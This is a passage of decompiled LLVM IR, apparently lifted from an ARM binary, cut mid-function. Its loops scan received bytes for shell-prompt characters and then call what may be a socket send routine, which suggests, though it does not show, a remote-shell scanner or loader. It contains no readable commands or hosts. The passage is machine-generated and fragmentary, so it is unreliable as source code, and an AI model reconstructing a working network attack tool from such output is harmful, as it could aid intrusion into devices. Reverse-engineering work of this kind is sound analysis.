  %v0_f3f0 = phi i32 [ %v1_f374, %dec_label_pc_f3a4 ], [ %v1_f374, %dec_label_pc_f380 ], [ %v1_f374, %dec_label_pc_f39c ], [ %v1_f374, %dec_label_pc_f394 ], [ %v1_f374, %bb438 ], [ %v1_f3d4, %dec_label_pc_f3b8 ], [ %v1_f3d4, %dec_label_pc_f3c0 ], [ %v1_f3d4, %dec_label_pc_f3c8 ], [ %v1_f3d4, %bb439 ], [ %v1_f3d4, %dec_label_pc_f3dc ]
  store i32 8, i32* %r0.global-to-local, align 4
  %v1_f3f0 = add i32 %v0_f3f0, 1
  store i32 %v1_f3f0, i32* @r7, align 4
  %v1_f3f4 = call i32 @function_fd64(i32 8)
  store i32 %v2_f7e8, i32* %r1.global-to-local, align 4
  store i32 8, i32* %r0.global-to-local, align 4
  %v3_f404 = call i32 @function_fca0(i32 8, i32* nonnull %stack_var_-60)
  store i32 %v3_f404, i32* %r0.global-to-local, align 4
  %v3_f408 = load i32, i32* %stack_var_-60, align 4
  store i32 %v3_f408, i32* %r2.global-to-local, align 4
  store i32 %v3_f404, i32* %r1.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_f414 = load i32, i32* @r6, align 4
  %v1_f414 = add i32 %v0_f414, 4
  %v2_f414 = inttoptr i32 %v1_f414 to i32*
  %v3_f414 = load i32, i32* %v2_f414, align 4
  store i32 %v3_f414, i32* %r0.global-to-local, align 4
  %v4_f418 = call i32 @function_11538(i32 %v3_f414, i32 %v3_f404, i32 %v3_f408, i32 16384)
  store i32 %v4_f418, i32* %r0.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_16224.187 to i32), i32* %r1.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  %v0_f428 = load i32, i32* @r6, align 4
  %v1_f428 = add i32 %v0_f428, 4
  %v2_f428 = inttoptr i32 %v1_f428 to i32*
  %v3_f428 = load i32, i32* %v2_f428, align 4
  store i32 %v3_f428, i32* %r0.global-to-local, align 4
  %v4_f42c = call i32 @function_11538(i32 %v3_f428, i32 ptrtoint ([3 x i8]* @global_var_16224.187 to i32), i32 2, i32 16384)
  store i32 8, i32* %r0.global-to-local, align 4
  %v1_f434 = call i32 @function_fcc4(i32 8)
  store i32 %v1_f434, i32* %r0.global-to-local, align 4
  store i32 7, i32* @r3, align 4
  %v1_f43c = load i32, i32* @r6, align 4
  %v2_f43c = add i32 %v1_f43c, 12
  %v3_f43c = inttoptr i32 %v2_f43c to i32*
  store i32 7, i32* %v3_f43c, align 4
  br label %dec_label_pc_f0d0

dec_label_pc_f444:                                ; preds = %dec_label_pc_efb4
  %v1_f444 = add i32 %v0_efb4, 24
  %v2_f444 = inttoptr i32 %v1_f444 to i32*
  %v3_f444 = load i32, i32* %v2_f444, align 4
  store i32 %v3_f444, i32* %r2.global-to-local, align 4
  %v1_f448 = add i32 %v3_f444, -1
  store i32 %v1_f448, i32* %r1.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_f44c = icmp eq i32 %v1_f448, 0
  store i1 %v2_f44c, i1* %cpsr_z.global-to-local, align 1
  %tmp440 = icmp slt i32 %v1_f448, 1
  br i1 %tmp440, label %dec_label_pc_ef38.backedge.thread, label %dec_label_pc_f454

dec_label_pc_f454:                                ; preds = %dec_label_pc_f444
  %v2_f454 = add i32 %v1_f448, %v0_efb4
  store i32 %v2_f454, i32* %r3.global-to-local, align 4
  %v1_f458 = add i32 %v2_f454, 28
  %v2_f458 = inttoptr i32 %v1_f458 to i8*
  %v3_f458 = load i8, i8* %v2_f458, align 1
  %v4_f458 = zext i8 %v3_f458 to i32
  store i32 %v4_f458, i32* %r3.global-to-local, align 4
  %v2_f45c = icmp ugt i8 %v3_f458, 61
  store i1 %v2_f45c, i1* %cpsr_c.global-to-local, align 1
  %v7_f45c = icmp eq i8 %v3_f458, 62
  store i1 %v7_f45c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f45c, label %dec_label_pc_f4c0, label %bb441

bb441:                                            ; preds = %dec_label_pc_f454
  %v3_f460 = icmp ugt i8 %v3_f458, 57
  store i1 %v3_f460, i1* %cpsr_c.global-to-local, align 1
  %v8_f460 = icmp eq i8 %v3_f458, 58
  store i1 %v8_f460, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_f460, label %dec_label_pc_f4c0, label %dec_label_pc_f468

dec_label_pc_f468:                                ; preds = %bb441
  %v2_f468 = icmp ugt i8 %v3_f458, 35
  store i1 %v2_f468, i1* %cpsr_c.global-to-local, align 1
  %v7_f468 = icmp eq i8 %v3_f458, 36
  store i1 %v7_f468, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f468, label %dec_label_pc_f4c0, label %dec_label_pc_f470

dec_label_pc_f470:                                ; preds = %dec_label_pc_f468
  %v2_f470 = icmp ugt i8 %v3_f458, 34
  store i1 %v2_f470, i1* %cpsr_c.global-to-local, align 1
  %v7_f470 = icmp eq i8 %v3_f458, 35
  store i1 %v7_f470, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f470, label %dec_label_pc_f4c0, label %dec_label_pc_f478

dec_label_pc_f478:                                ; preds = %dec_label_pc_f470
  %v2_f478 = icmp ugt i8 %v3_f458, 36
  store i1 %v2_f478, i1* %cpsr_c.global-to-local, align 1
  %v7_f478 = icmp eq i8 %v3_f458, 37
  store i1 %v7_f478, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f478, label %dec_label_pc_f4c0, label %dec_label_pc_f4a8.preheader

dec_label_pc_f4a8.preheader:                      ; preds = %dec_label_pc_f478
  %v3_f47c = add i32 %v0_efb4, 28
  %v2_f480 = add i32 %v3_f47c, %v3_f444
  store i32 %v2_f480, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_f4a8

dec_label_pc_f48c:                                ; preds = %bb442
  %v2_f48c = icmp ugt i8 %v3_f4b0, 35
  store i1 %v2_f48c, i1* %cpsr_c.global-to-local, align 1
  %v7_f48c = icmp eq i8 %v3_f4b0, 36
  store i1 %v7_f48c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f48c, label %dec_label_pc_f4c0, label %dec_label_pc_f494

dec_label_pc_f494:                                ; preds = %dec_label_pc_f48c
  %v2_f494 = icmp ugt i8 %v3_f4b0, 34
  store i1 %v2_f494, i1* %cpsr_c.global-to-local, align 1
  %v7_f494 = icmp eq i8 %v3_f4b0, 35
  store i1 %v7_f494, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f494, label %dec_label_pc_f4c0, label %dec_label_pc_f49c

dec_label_pc_f49c:                                ; preds = %dec_label_pc_f494
  %v2_f49c = icmp ugt i8 %v3_f4b0, 36
  store i1 %v2_f49c, i1* %cpsr_c.global-to-local, align 1
  %v7_f49c = icmp eq i8 %v3_f4b0, 37
  store i1 %v7_f49c, i1* %cpsr_z.global-to-local, align 1
  %v1_f4a0 = add i32 %v0_f4a0, -1
  store i32 %v1_f4a0, i32* %r3.global-to-local, align 4
  br i1 %v7_f49c, label %dec_label_pc_f4c0, label %dec_label_pc_f4a8

dec_label_pc_f4a8:                                ; preds = %dec_label_pc_f4a8.preheader, %dec_label_pc_f49c
  %v0_f4a0 = phi i32 [ %v2_f480, %dec_label_pc_f4a8.preheader ], [ %v1_f4a0, %dec_label_pc_f49c ]
  %v0_f4a8 = phi i32 [ %v1_f448, %dec_label_pc_f4a8.preheader ], [ %v1_f4a8, %dec_label_pc_f49c ]
  %v1_f4a8 = add i32 %v0_f4a8, -1
  store i32 %v1_f4a8, i32* %r1.global-to-local, align 4
  %v2_f4a8 = icmp ne i32 %v0_f4a8, 0
  store i1 %v2_f4a8, i1* %cpsr_c.global-to-local, align 1
  %v7_f4a8 = icmp eq i32 %v0_f4a8, 1
  store i1 %v7_f4a8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f4a8, label %dec_label_pc_ef38.backedge.thread561, label %dec_label_pc_f4b0

dec_label_pc_f4b0:                                ; preds = %dec_label_pc_f4a8
  %v1_f4b0 = add i32 %v0_f4a0, -2
  %v2_f4b0 = inttoptr i32 %v1_f4b0 to i8*
  %v3_f4b0 = load i8, i8* %v2_f4b0, align 1
  %v4_f4b0 = zext i8 %v3_f4b0 to i32
  store i32 %v4_f4b0, i32* %r2.global-to-local, align 4
  %v2_f4b4 = icmp ugt i8 %v3_f4b0, 61
  store i1 %v2_f4b4, i1* %cpsr_c.global-to-local, align 1
  %v7_f4b4 = icmp eq i8 %v3_f4b0, 62
  store i1 %v7_f4b4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f4b4, label %dec_label_pc_f4c0, label %bb442

bb442:                                            ; preds = %dec_label_pc_f4b0
  %v3_f4b8 = icmp ugt i8 %v3_f4b0, 57
  store i1 %v3_f4b8, i1* %cpsr_c.global-to-local, align 1
  %v8_f4b8 = icmp eq i8 %v3_f4b0, 58
  store i1 %v8_f4b8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_f4b8, label %dec_label_pc_f4c0, label %dec_label_pc_f48c

dec_label_pc_f4c0:                                ; preds = %dec_label_pc_f4b0, %bb442, %dec_label_pc_f49c, %dec_label_pc_f494, %dec_label_pc_f48c, %dec_label_pc_f478, %dec_label_pc_f454, %dec_label_pc_f470, %dec_label_pc_f468, %bb441
  %v0_f4c4 = phi i32 [ %v1_f448, %dec_label_pc_f478 ], [ %v1_f448, %dec_label_pc_f454 ], [ %v1_f448, %dec_label_pc_f470 ], [ %v1_f448, %dec_label_pc_f468 ], [ %v1_f448, %bb441 ], [ %v1_f4a8, %dec_label_pc_f48c ], [ %v1_f4a8, %dec_label_pc_f494 ], [ %v1_f4a8, %dec_label_pc_f49c ], [ %v1_f4a8, %bb442 ], [ %v1_f4a8, %dec_label_pc_f4b0 ]
  store i32 7, i32* %r0.global-to-local, align 4
  %v1_f4c4 = add i32 %v0_f4c4, 1
  store i32 %v1_f4c4, i32* @r7, align 4
  %v1_f4c8 = call i32 @function_fd64(i32 7)
  store i32 %v2_f7e8, i32* %r1.global-to-local, align 4
  store i32 7, i32* %r0.global-to-local, align 4
  %v3_f4d8 = call i32 @function_fca0(i32 7, i32* nonnull %stack_var_-60)
  store i32 %v3_f4d8, i32* %r0.global-to-local, align 4
  %v3_f4dc = load i32, i32* %stack_var_-60, align 4
  store i32 %v3_f4dc, i32* %r2.global-to-local, align 4
  store i32 %v3_f4d8, i32* %r1.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_f4e8 = load i32, i32* @r6, align 4
  %v1_f4e8 = add i32 %v0_f4e8, 4
  %v2_f4e8 = inttoptr i32 %v1_f4e8 to i32*
  %v3_f4e8 = load i32, i32* %v2_f4e8, align 4
  store i32 %v3_f4e8, i32* %r0.global-to-local, align 4
  %v4_f4ec = call i32 @function_11538(i32 %v3_f4e8, i32 %v3_f4d8, i32 %v3_f4dc, i32 16384)
  store i32 %v4_f4ec, i32* %r0.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_16224.187 to i32), i32* %r1.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  %v0_f4fc = load i32, i32* @r6, align 4
  %v1_f4fc = add i32 %v0_f4fc, 4
  %v2_f4fc = inttoptr i32 %v1_f4fc to i32*
  %v3_f4fc = load i32, i32* %v2_f4fc, align 4
  store i32 %v3_f4fc, i32* %r0.global-to-local, align 4
  %v4_f500 = call i32 @function_11538(i32 %v3_f4fc, i32 ptrtoint ([3 x i8]* @global_var_16224.187 to i32), i32 2, i32 16384)
  store i32 7, i32* %r0.global-to-local, align 4
  %v1_f508 = call i32 @function_fcc4(i32 7)
  store i32 %v1_f508, i32* %r0.global-to-local, align 4
  store i32 6, i32* @r3, align 4
  %v1_f510 = load i32, i32* @r6, align 4
  %v2_f510 = add i32 %v1_f510, 12
  %v3_f510 = inttoptr i32 %v2_f510 to i32*
  store i32 6, i32* %v3_f510, align 4
  br label %dec_label_pc_f0d0

dec_label_pc_f590:                                ; preds = %dec_label_pc_efb4
  %v1_f590 = add i32 %v0_efb4, 24
  %v2_f590 = inttoptr i32 %v1_f590 to i32*
  %v3_f590 = load i32, i32* %v2_f590, align 4
  store i32 %v3_f590, i32* %r2.global-to-local, align 4
  %v1_f594 = add i32 %v3_f590, -1
  store i32 %v1_f594, i32* %r1.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_f598 = icmp eq i32 %v1_f594, 0
  store i1 %v2_f598, i1* %cpsr_z.global-to-local, align 1
  %tmp443 = icmp slt i32 %v1_f594, 1
  br i1 %tmp443, label %dec_label_pc_ef38.backedge.thread, label %dec_label_pc_f5a0

dec_label_pc_f5a0:                                ; preds = %dec_label_pc_f590
  %v2_f5a0 = add i32 %v1_f594, %v0_efb4
  store i32 %v2_f5a0, i32* %r3.global-to-local, align 4
  %v1_f5a4 = add i32 %v2_f5a0, 28
  %v2_f5a4 = inttoptr i32 %v1_f5a4 to i8*
  %v3_f5a4 = load i8, i8* %v2_f5a4, align 1
  %v4_f5a4 = zext i8 %v3_f5a4 to i32
  store i32 %v4_f5a4, i32* %r3.global-to-local, align 4
  %v2_f5a8 = icmp ugt i8 %v3_f5a4, 61
  store i1 %v2_f5a8, i1* %cpsr_c.global-to-local, align 1
  %v7_f5a8 = icmp eq i8 %v3_f5a4, 62
  store i1 %v7_f5a8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f5a8, label %dec_label_pc_f60c, label %bb444

bb444:                                            ; preds = %dec_label_pc_f5a0
  %v3_f5ac = icmp ugt i8 %v3_f5a4, 57
  store i1 %v3_f5ac, i1* %cpsr_c.global-to-local, align 1
  %v8_f5ac = icmp eq i8 %v3_f5a4, 58
  store i1 %v8_f5ac, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_f5ac, label %dec_label_pc_f60c, label %dec_label_pc_f5b4

dec_label_pc_f5b4:                                ; preds = %bb444
  %v2_f5b4 = icmp ugt i8 %v3_f5a4, 35
  store i1 %v2_f5b4, i1* %cpsr_c.global-to-local, align 1
  %v7_f5b4 = icmp eq i8 %v3_f5a4, 36
  store i1 %v7_f5b4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f5b4, label %dec_label_pc_f60c, label %dec_label_pc_f5bc

dec_label_pc_f5bc:                                ; preds = %dec_label_pc_f5b4
  %v2_f5bc = icmp ugt i8 %v3_f5a4, 34
  store i1 %v2_f5bc, i1* %cpsr_c.global-to-local, align 1
  %v7_f5bc = icmp eq i8 %v3_f5a4, 35
  store i1 %v7_f5bc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f5bc, label %dec_label_pc_f60c, label %dec_label_pc_f5c4

dec_label_pc_f5c4:                                ; preds = %dec_label_pc_f5bc
  %v2_f5c4 = icmp ugt i8 %v3_f5a4, 36
  store i1 %v2_f5c4, i1* %cpsr_c.global-to-local, align 1
  %v7_f5c4 = icmp eq i8 %v3_f5a4, 37
  store i1 %v7_f5c4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f5c4, label %dec_label_pc_f60c, label %dec_label_pc_f5f4.preheader

dec_label_pc_f5f4.preheader:                      ; preds = %dec_label_pc_f5c4
  %v3_f5c8 = add i32 %v0_efb4, 28
  %v2_f5cc = add i32 %v3_f5c8, %v3_f590
  store i32 %v2_f5cc, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_f5f4

dec_label_pc_f5d8:                                ; preds = %bb445
  %v2_f5d8 = icmp ugt i8 %v3_f5fc, 35
  store i1 %v2_f5d8, i1* %cpsr_c.global-to-local, align 1
  %v7_f5d8 = icmp eq i8 %v3_f5fc, 36
  store i1 %v7_f5d8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f5d8, label %dec_label_pc_f60c, label %dec_label_pc_f5e0

dec_label_pc_f5e0:                                ; preds = %dec_label_pc_f5d8
  %v2_f5e0 = icmp ugt i8 %v3_f5fc, 34
  store i1 %v2_f5e0, i1* %cpsr_c.global-to-local, align 1
  %v7_f5e0 = icmp eq i8 %v3_f5fc, 35
  store i1 %v7_f5e0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f5e0, label %dec_label_pc_f60c, label %dec_label_pc_f5e8

dec_label_pc_f5e8:                                ; preds = %dec_label_pc_f5e0
  %v2_f5e8 = icmp ugt i8 %v3_f5fc, 36
  store i1 %v2_f5e8, i1* %cpsr_c.global-to-local, align 1
  %v7_f5e8 = icmp eq i8 %v3_f5fc, 37
  store i1 %v7_f5e8, i1* %cpsr_z.global-to-local, align 1
  %v1_f5ec = add i32 %v0_f5ec, -1
  store i32 %v1_f5ec, i32* %r3.global-to-local, align 4
  br i1 %v7_f5e8, label %dec_label_pc_f60c, label %dec_label_pc_f5f4

dec_label_pc_f5f4:                                ; preds = %dec_label_pc_f5f4.preheader, %dec_label_pc_f5e8
  %v0_f5ec = phi i32 [ %v2_f5cc, %dec_label_pc_f5f4.preheader ], [ %v1_f5ec, %dec_label_pc_f5e8 ]
  %v0_f5f4 = phi i32 [ %v1_f594, %dec_label_pc_f5f4.preheader ], [ %v1_f5f4, %dec_label_pc_f5e8 ]
  %v1_f5f4 = add i32 %v0_f5f4, -1
  store i32 %v1_f5f4, i32* %r1.global-to-local, align 4
  %v2_f5f4 = icmp ne i32 %v0_f5f4, 0
  store i1 %v2_f5f4, i1* %cpsr_c.global-to-local, align 1
  %v7_f5f4 = icmp eq i32 %v0_f5f4, 1
  store i1 %v7_f5f4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f5f4, label %dec_label_pc_ef38.backedge.thread561, label %dec_label_pc_f5fc

dec_label_pc_f5fc:                                ; preds = %dec_label_pc_f5f4
  %v1_f5fc = add i32 %v0_f5ec, -2
  %v2_f5fc = inttoptr i32 %v1_f5fc to i8*
  %v3_f5fc = load i8, i8* %v2_f5fc, align 1
  %v4_f5fc = zext i8 %v3_f5fc to i32
  store i32 %v4_f5fc, i32* %r2.global-to-local, align 4
  %v2_f600 = icmp ugt i8 %v3_f5fc, 61
  store i1 %v2_f600, i1* %cpsr_c.global-to-local, align 1
  %v7_f600 = icmp eq i8 %v3_f5fc, 62
  store i1 %v7_f600, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f600, label %dec_label_pc_f60c, label %bb445

bb445:                                            ; preds = %dec_label_pc_f5fc
  %v3_f604 = icmp ugt i8 %v3_f5fc, 57
  store i1 %v3_f604, i1* %cpsr_c.global-to-local, align 1
  %v8_f604 = icmp eq i8 %v3_f5fc, 58
  store i1 %v8_f604, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_f604, label %dec_label_pc_f60c, label %dec_label_pc_f5d8

dec_label_pc_f60c:                                ; preds = %dec_label_pc_f5fc, %bb445, %dec_label_pc_f5e8, %dec_label_pc_f5e0, %dec_label_pc_f5d8, %dec_label_pc_f5c4, %dec_label_pc_f5a0, %dec_label_pc_f5bc, %dec_label_pc_f5b4, %bb444
  %v0_f610 = phi i32 [ %v1_f594, %dec_label_pc_f5c4 ], [ %v1_f594, %dec_label_pc_f5a0 ], [ %v1_f594, %dec_label_pc_f5bc ], [ %v1_f594, %dec_label_pc_f5b4 ], [ %v1_f594, %bb444 ], [ %v1_f5f4, %dec_label_pc_f5d8 ], [ %v1_f5f4, %dec_label_pc_f5e0 ], [ %v1_f5f4, %dec_label_pc_f5e8 ], [ %v1_f5f4, %bb445 ], [ %v1_f5f4, %dec_label_pc_f5fc ]
  store i32 6, i32* %r0.global-to-local, align 4
  %v1_f610 = add i32 %v0_f610, 1
  store i32 %v1_f610, i32* @r7, align 4
  %v1_f614 = call i32 @function_fd64(i32 6)
  store i32 %v2_f7e8, i32* %r1.global-to-local, align 4
  store i32 6, i32* %r0.global-to-local, align 4
  %v3_f624 = call i32 @function_fca0(i32 6, i32* nonnull %stack_var_-60)
  store i32 %v3_f624, i32* %r0.global-to-local, align 4
  %v3_f628 = load i32, i32* %stack_var_-60, align 4
  store i32 %v3_f628, i32* %r2.global-to-local, align 4
  store i32 %v3_f624, i32* %r1.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_f634 = load i32, i32* @r6, align 4
  %v1_f634 = add i32 %v0_f634, 4
  %v2_f634 = inttoptr i32 %v1_f634 to i32*
  %v3_f634 = load i32, i32* %v2_f634, align 4
  store i32 %v3_f634, i32* %r0.global-to-local, align 4
  %v4_f638 = call i32 @function_11538(i32 %v3_f634, i32 %v3_f624, i32 %v3_f628, i32 16384)
  store i32 %v4_f638, i32* %r0.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_16224.187 to i32), i32* %r1.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  %v0_f648 = load i32, i32* @r6, align 4
  %v1_f648 = add i32 %v0_f648, 4
  %v2_f648 = inttoptr i32 %v1_f648 to i32*
  %v3_f648 = load i32, i32* %v2_f648, align 4
  store i32 %v3_f648, i32* %r0.global-to-local, align 4
  %v4_f64c = call i32 @function_11538(i32 %v3_f648, i32 ptrtoint ([3 x i8]* @global_var_16224.187 to i32), i32 2, i32 16384)
  store i32 6, i32* %r0.global-to-local, align 4
  %v1_f654 = call i32 @function_fcc4(i32 6)
  store i32 %v1_f654, i32* %r0.global-to-local, align 4
  store i32 8, i32* @r3, align 4
  %v1_f65c = load i32, i32* @r6, align 4
  %v2_f65c = add i32 %v1_f65c, 12
  %v3_f65c = inttoptr i32 %v2_f65c to i32*
  store i32 8, i32* %v3_f65c, align 4
  br label %dec_label_pc_f0d0

dec_label_pc_f664:                                ; preds = %dec_label_pc_efb4
  %v1_f664 = add i32 %v0_efb4, 24
  %v2_f664 = inttoptr i32 %v1_f664 to i32*
  %v3_f664 = load i32, i32* %v2_f664, align 4
  store i32 %v3_f664, i32* %r2.global-to-local, align 4
  %v1_f668 = add i32 %v3_f664, -1
  store i32 %v1_f668, i32* %r1.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_f66c = icmp eq i32 %v1_f668, 0
  store i1 %v2_f66c, i1* %cpsr_z.global-to-local, align 1
  %tmp446 = icmp slt i32 %v1_f668, 1
  br i1 %tmp446, label %dec_label_pc_f6d0, label %dec_label_pc_f674

dec_label_pc_f674:                                ; preds = %dec_label_pc_f664
  %v2_f674 = add i32 %v1_f668, %v0_efb4
  store i32 %v2_f674, i32* %r3.global-to-local, align 4
  %v1_f678 = add i32 %v2_f674, 28
  %v2_f678 = inttoptr i32 %v1_f678 to i8*
  %v3_f678 = load i8, i8* %v2_f678, align 1
  %v4_f678 = zext i8 %v3_f678 to i32
  store i32 %v4_f678, i32* %r3.global-to-local, align 4
  %v2_f67c = icmp ugt i8 %v3_f678, 61
  store i1 %v2_f67c, i1* %cpsr_c.global-to-local, align 1
  %v7_f67c = icmp eq i8 %v3_f678, 62
  store i1 %v7_f67c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f67c, label %dec_label_pc_f938, label %bb447

bb447:                                            ; preds = %dec_label_pc_f674
  %v3_f680 = icmp ugt i8 %v3_f678, 57
  store i1 %v3_f680, i1* %cpsr_c.global-to-local, align 1
  %v8_f680 = icmp eq i8 %v3_f678, 58
  store i1 %v8_f680, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_f680, label %dec_label_pc_f938, label %dec_label_pc_f688

dec_label_pc_f688:                                ; preds = %bb447
  %v2_f688 = icmp ugt i8 %v3_f678, 35
  store i1 %v2_f688, i1* %cpsr_c.global-to-local, align 1
  %v7_f688 = icmp eq i8 %v3_f678, 36
  store i1 %v7_f688, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f688, label %dec_label_pc_f938, label %dec_label_pc_f690

dec_label_pc_f690:                                ; preds = %dec_label_pc_f688
  %v2_f690 = icmp ugt i8 %v3_f678, 34
  store i1 %v2_f690, i1* %cpsr_c.global-to-local, align 1
  %v7_f690 = icmp eq i8 %v3_f678, 35
  store i1 %v7_f690, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f690, label %dec_label_pc_f938, label %dec_label_pc_f6c8.preheader

dec_label_pc_f6c8.preheader:                      ; preds = %dec_label_pc_f690
  %v3_f694 = add i32 %v0_efb4, 28
  %v2_f698 = add i32 %v3_f694, %v3_f664
  store i32 %v2_f698, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_f6c8

dec_label_pc_f6a4:                                ; preds = %dec_label_pc_f6c8
  %v1_f6a4 = add i32 %v0_f6c0, -2
  %v2_f6a4 = inttoptr i32 %v1_f6a4 to i8*
  %v3_f6a4 = load i8, i8* %v2_f6a4, align 1
  %v4_f6a4 = zext i8 %v3_f6a4 to i32
  store i32 %v4_f6a4, i32* %r2.global-to-local, align 4
  %v2_f6a8 = icmp ugt i8 %v3_f6a4, 61
  store i1 %v2_f6a8, i1* %cpsr_c.global-to-local, align 1
  %v7_f6a8 = icmp eq i8 %v3_f6a4, 62
  store i1 %v7_f6a8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f6a8, label %dec_label_pc_f938, label %bb448

bb448:                                            ; preds = %dec_label_pc_f6a4
  %v3_f6ac = icmp ugt i8 %v3_f6a4, 57
  store i1 %v3_f6ac, i1* %cpsr_c.global-to-local, align 1
  %v8_f6ac = icmp eq i8 %v3_f6a4, 58
  store i1 %v8_f6ac, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_f6ac, label %dec_label_pc_f938, label %dec_label_pc_f6b4

dec_label_pc_f6b4:                                ; preds = %bb448
  %v2_f6b4 = icmp ugt i8 %v3_f6a4, 35
  store i1 %v2_f6b4, i1* %cpsr_c.global-to-local, align 1
  %v7_f6b4 = icmp eq i8 %v3_f6a4, 36
  store i1 %v7_f6b4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f6b4, label %dec_label_pc_f938, label %dec_label_pc_f6bc

dec_label_pc_f6bc:                                ; preds = %dec_label_pc_f6b4
  %v2_f6bc = icmp ugt i8 %v3_f6a4, 34
  store i1 %v2_f6bc, i1* %cpsr_c.global-to-local, align 1
  %v7_f6bc = icmp eq i8 %v3_f6a4, 35
  store i1 %v7_f6bc, i1* %cpsr_z.global-to-local, align 1
  %v1_f6c0 = add i32 %v0_f6c0, -1
  store i32 %v1_f6c0, i32* %r3.global-to-local, align 4
  br i1 %v7_f6bc, label %dec_label_pc_f938, label %dec_label_pc_f6c8

dec_label_pc_f6c8:                                ; preds = %dec_label_pc_f6c8.preheader, %dec_label_pc_f6bc
  %v0_f6c0 = phi i32 [ %v2_f698, %dec_label_pc_f6c8.preheader ], [ %v1_f6c0, %dec_label_pc_f6bc ]
  %v0_f6c8 = phi i32 [ %v1_f668, %dec_label_pc_f6c8.preheader ], [ %v1_f6c8, %dec_label_pc_f6bc ]
  %v1_f6c8 = add i32 %v0_f6c8, -1
  store i32 %v1_f6c8, i32* %r1.global-to-local, align 4
  %v2_f6c8 = icmp ne i32 %v0_f6c8, 0
  store i1 %v2_f6c8, i1* %cpsr_c.global-to-local, align 1
  %v7_f6c8 = icmp eq i32 %v0_f6c8, 1
  store i1 %v7_f6c8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f6c8, label %dec_label_pc_f6d0, label %dec_label_pc_f6a4

dec_label_pc_f6d0:                                ; preds = %dec_label_pc_f6c8, %dec_label_pc_f664
  store i32 28, i32* %r0.global-to-local, align 4
  %v1_f6d4 = call i32 @function_fd64(i32 28)
  store i32 %v2_f7e8, i32* %r1.global-to-local, align 4
  store i32 28, i32* %r0.global-to-local, align 4
  %v3_f6e4 = call i32 @function_fca0(i32 28, i32* nonnull %stack_var_-60)
  %v3_f6e8 = load i32, i32* %stack_var_-60, align 4
  store i32 %v3_f6e4, i32* %r2.global-to-local, align 4
  %v1_f6f0 = add i32 %v3_f6e8, -1
  store i32 %v1_f6f0, i32* %r3.global-to-local, align 4
  %v0_f6f4 = load i32, i32* %sb.global-to-local, align 4
  store i32 %v0_f6f4, i32* %r0.global-to-local, align 4
  %v0_f6f8 = load i32, i32* @r6, align 4
  %v1_f6f8 = add i32 %v0_f6f8, 24
  %v2_f6f8 = inttoptr i32 %v1_f6f8 to i32*
  %v3_f6f8 = load i32, i32* %v2_f6f8, align 4
  store i32 %v3_f6f8, i32* %r1.global-to-local, align 4
  %v4_f6fc = call i32 @function_103d4(i32 %v0_f6f4, i32 %v3_f6f8, i32 %v3_f6e4, i32 %v1_f6f0)
  store i32 %v4_f6fc, i32* %r0.global-to-local, align 4
  %v1_f700 = add i32 %v4_f6fc, 1
  store i32 %v1_f700, i32* @r7, align 4
  %v2_f700 = icmp eq i32 %v4_f6fc, -1
  store i1 %v2_f700, i1* %cpsr_c.global-to-local, align 1
  %v7_f700 = icmp eq i32 %v1_f700, 0
  store i1 %v7_f700, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f700, label %thread-pre-split124, label %bb449

bb449:                                            ; preds = %dec_label_pc_f6d0
  store i32 1, i32* @r7, align 4
  br label %thread-pre-split124

thread-pre-split124:                              ; preds = %dec_label_pc_f6d0, %bb449
  %v0_f708 = phi i1 [ false, %bb449 ], [ true, %dec_label_pc_f6d0 ]
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 %v0_f708, i1* %cpsr_z.global-to-local, align 1
  store i32 28, i32* %r0.global-to-local, align 4
  %v1_fb54 = call i32 @function_fcc4(i32 28)
  br i1 %v0_f708, label %dec_label_pc_fb50, label %dec_label_pc_f718

dec_label_pc_f718:                                ; preds = %thread-pre-split124, %dec_label_pc_f938
  %storemerge = phi i32 [ %v1_f940, %dec_label_pc_f938 ], [ %v1_fb54, %thread-pre-split124 ]
